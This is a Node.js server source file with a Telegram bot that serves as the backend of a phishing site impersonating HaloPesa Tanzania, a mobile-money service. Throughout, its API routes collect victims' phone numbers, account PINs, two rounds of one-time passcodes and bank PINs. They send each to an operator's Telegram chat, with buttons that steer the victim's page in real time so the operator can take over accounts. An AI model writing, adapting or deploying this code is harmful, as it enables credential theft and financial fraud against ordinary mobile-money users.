const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Tanzania";
    const countryCode = "+255";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>HALOPESA TANZANIA - JARIBIO LA KUINGIA</b>

🆕 <b>MTUMIAJI MPYA</b>
🇹🇿 <b>Nchi:</b> ${country}
🌍 <b>Nambari ya Nchi:</b> ${countryCode}
📱 <b>Nambari ya Simu:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Wakati:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Mtumiaji anasubiri idhini</b>
⌛ <b>Muda wa kusubiri: Dakika 5</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Ruhusu", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Taarifa Si Sahihi", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API (4-CHARACTER VERIFICATION CODE) --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Tanzania";
    const countryCode = "+255";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🆕 <b>HALOPESA TANZANIA - UTHIBITISHO UNAHITAJIKA</b>
🇹🇿 <b>Nchi:</b> ${country}
📞 <b>Nambari ya Nchi:</b> ${countryCode}
📱 <b>Nambari ya Simu:</b> ${phone}
🔑 <b>MSABO/OTP (4 DIGITS):</b> <code>${code}</code>
⏰ <b>Wakati:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Thibitisha taarifa:</b>
⏰ <b>Muda wa kusubiri: Dakika 5</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Sahihi (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Namba Si Sahihi", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ PIN Si Sahihi", callback_data: `otp2_wrongpin|${phone}` }
                    ],
                    [
                        { text: "📞 Wasiliana Nasi", callback_data: `contact_us|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Tanzania";
    const countryCode = "+255";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>HALOPESA TANZANIA - OTP YA PILI (Hatua ya 2/2)</b>

🆕 <b>MTUMIAJI MPYA - UTHIBITISHO WA PILI</b>
🇹🇿 <b>Nchi:</b> ${country}
🌍 <b>Nambari ya Nchi:</b> ${countryCode}
📱 <b>Nambari ya Simu:</b> ${phone}
🔐 <b>Namba ya Pili ya OTP:</b> ${otp}
⏰ <b>Wakati:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Thibitisha OTP ya Pili:</b>
⌛ <b>Muda wa kusubiri: Dakika 5</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Sahihi", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Namba Si Sahihi", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 PIN Si Sahihi", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>OMBI LA KUTUMA TENA KODI</b>

📱 <b>Nambari ya Simu:</b> ${phone}
📍 <b>Hatua:</b> ${step}
⚠️ <b>Mtumiaji anasubiri namba mpya.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Tanzania";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>HALOPESA TANZANIA - UTHIBITISHO WA PIN YA BENKI</b>

🆕 <b>MTUMIAJI MPYA - USALAMA WA BENKI</b>
🇹🇿 <b>Nchi:</b> ${country}
📱 <b>Nambari ya Simu:</b> ${phone}
🔑 <b>PIN ya Benki:</b> ${bankPin}
⏰ <b>Wakati:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Thibitisha PIN ya Benki:</b>
⌛ <b>Muda wa kusubiri: Dakika 5</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Sahihi", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ PIN Si Sahihi", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>IMEIDHINISHWA</b>

🆕 <b>MTUMIAJI MPYA</b>
🇹🇿 <b>Tanzania</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Hali: Imeidhinishwa</b>
➡️ <b>Inayofuata: OTP ya Kwanza</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Ruhusa imetolewa");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b> TAARIFA SI SAHIHI</b>

🇹🇿 <b>Tanzania</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Hali: Imekataliwa</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Imekataliwa");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>OTP YA KWANZA IMETHIBITISHWA</b>

🇹🇿 <b>Tanzania</b>
📱 <b>${phone}</b>

━━━━━━━━━━━━━━━

✅ <b>Hali: Imethibitishwa</b>
➡️ <b>Inayofuata: Hatua inayofuata</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Imethibitishwa");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Namba Si Sahihi");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>OTP YA KWANZA SI SAHIHI</b>\n📱 <b>Mtumiaji:</b> ${phone}\n⚠️ <b>Ameombwa kuweka tena.</b>`);
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "contact_us";
    await ctx.answerCbQuery("Wasiliana Nasi");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>MSAADA UMEOMBIWA</b>\n📱 <b>Mtumiaji:</b> ${phone}\n⚠️ <b>Ameomba msaada.</b>`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>OTP YA PILI IMETHIBITISHWA</b>

🇹🇿 <b>Tanzania</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Hali: Imethibitishwa</b>
✅ <b>Mchakato umekamilika</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Imekamilika");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Namba Si Sahihi");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>OTP YA PILI SI SAHIHI</b>\n📱 <b>Mtumiaji:</b> ${phone}\n⚠️ <b>Ameombwa kuweka tena.</b>`);
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>PIN YA BENKI IMETHIBITISHWA</b>

🇹🇿 <b>Tanzania</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Hali: Mchakato Umekamilika</b>
🏁 <b>Mtumiaji ameelekezwa kwenye ukurasa wa mafanikio</b>`;

    await ctx.answerCbQuery("Imethibitishwa");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("PIN Si Sahihi");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PIN YA BENKI SI SAHIHI</b>\n📱 <b>Mtumiaji:</b> ${phone}\n⚠️ <b>Ameombwa kuweka tena.</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("PIN Si Sahihi");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>PIN ISIYO SAHIHI IMEWEKWA</b>\n📱 <b>Mtumiaji:</b> ${phone}\n⚠️ <b>Ameombwa kuweka PIN upya.</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
